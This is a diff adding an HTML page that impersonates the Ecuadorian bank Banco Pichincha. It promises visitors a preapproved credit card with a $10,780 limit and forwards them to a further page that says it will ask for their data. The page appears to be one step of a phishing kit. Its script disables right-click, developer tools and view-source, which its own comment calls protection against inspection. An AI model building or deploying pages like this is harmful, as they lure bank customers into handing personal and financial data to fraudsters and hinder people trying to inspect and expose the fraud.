@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Banco Pichincha</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:#ffffff;
+    color:#1a1a1a;
+}
+
+/* HEADER */
+.header{
+    padding:16px;
+    box-shadow:0 2px 6px rgba(0,0,0,.15);
+}
+
+.logo{
+    height:36px;
+}
+
+/* CONTENIDO */
+.container{
+    padding:30px 20px 40px;
+    text-align:center;
+}
+
+.image-box{
+    margin:40px auto 30px;
+    max-width:280px;
+}
+
+.image-box img{
+    width:80%;
+    height:auto;
+}
+
+/* TEXTOS */
+.title{
+    font-size:16px;
+    font-weight:bold;
+    color:#0b2a5b;
+    margin-bottom:15px;
+}
+
+.description{
+    font-size:13px;
+    color:#555;
+    line-height:1.5;
+    margin-bottom:40px;
+}
+
+/* BOTÓN */
+button{
+    width:90%;
+    max-width:360px;
+    background:#ffd200;
+    border:none;
+    padding:16px;
+    font-size:18px;
+    font-weight:bold;
+    border-radius:6px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#f5c400;
+}
+</style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/45/Banco_Pichincha_nuevo.png" class="logo" alt="Banco Pichincha">
+</div>
+
+<!-- CONTENIDO -->
+<div class="container">
+
+    <!-- IMAGEN DEL MUCHACHO -->
+    <div class="image-box">
+        <img src="https://saprodtarjetas.blob.core.windows.net/public/images/Error%20Page/notClientOffer.png" alt="Ilustración informativa">
+    </div>
+
+    <div class="title">
+        Necesitamos más información
+    </div>
+
+    <div class="description">
+        Al momento contamos con una tarjeta disponible para ti con un cupo de $10.780
+        Para realizar este proceso te haremos algunas preguntas y te pediremos algunos datos adicionales.
+    </div>
+
+    <button>Continuar</button>
+
+</div>
+<script>
+// 1. Protección contra inspección (Bloqueo de F12, Clic Derecho, Ctrl+U)
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.onkeydown = e => {
+    if (e.keyCode == 123 || 
+        (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || 
+        (e.ctrlKey && e.keyCode == 85)) {
+        return false;
+    }
+};
+
+// 2. Redirección al hacer clic en el botón
+document.querySelector('button').addEventListener('click', function() {
+    window.location.href = "2569.html";
+});
+</script>
+</body>
+</html>
